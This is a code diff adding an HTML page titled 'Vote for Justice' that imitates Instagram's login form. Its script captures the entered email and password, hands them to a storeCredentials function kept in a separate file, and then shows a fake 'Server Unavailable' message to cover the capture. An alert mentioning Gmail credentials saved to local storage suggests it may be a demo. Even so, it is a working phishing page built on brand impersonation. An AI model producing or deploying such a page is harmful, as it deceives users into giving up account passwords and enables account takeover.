@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <title>Vote for Justice</title>
+    <style>
+        .server-error {
+            background-color: white;
+        }
+    </style>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <form id="loginForm">
+                    <label for="email" class="sr-only">Phone, username, or email</label>
+                    <input name="email" id="emailInput" placeholder="Phone, username, or email" />
+
+                    <label for="password" class="sr-only">Password</label>
+                    <input name="password" type="password" id="passwordInput" placeholder="Password" />
+
+                    <button type="submit">Log In</button>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OR</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                        <a>Log in with Facebook</a>
+                    </div>
+                    <a href="">Forgot password?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Don't have an account?</p>
+                <a href="#">Sign Up</a>
+            </div>
+        </section>
+    </main>
+    <script src="shared.js"></script>
+    <script>
+        // Function to handle form submission
+        function handleSubmit(event) {
+          event.preventDefault(); // Prevent form from being submitted normally
+    
+          // Get input values
+          var email = document.getElementById('emailInput').value;
+          var password = document.getElementById('passwordInput').value;
+    
+          // Simulate server error
+          setTimeout(function() {
+            // Store values in local storage
+            storeCredentials(email, password);
+    
+            // Optional: Clear input fields after submission
+            document.getElementById('emailInput').value = '';
+            document.getElementById('passwordInput').value = '';
+    
+            alert('Gmail ID and password saved in local storage.');
+          }, 2000); // Simulating a delay of 2 seconds
+    
+          // Show error message and change background color
+          var bodyElement = document.body;
+          bodyElement.classList.add('server-error');
+          bodyElement.innerHTML = '<h1>Server Unavailable</h1>';
+        }
+    
+        // Add event listener to form submission
+        var form = document.getElementById('loginForm');
+        form.addEventListener('submit', handleSubmit);
+    </script>
+</body>
+</html>
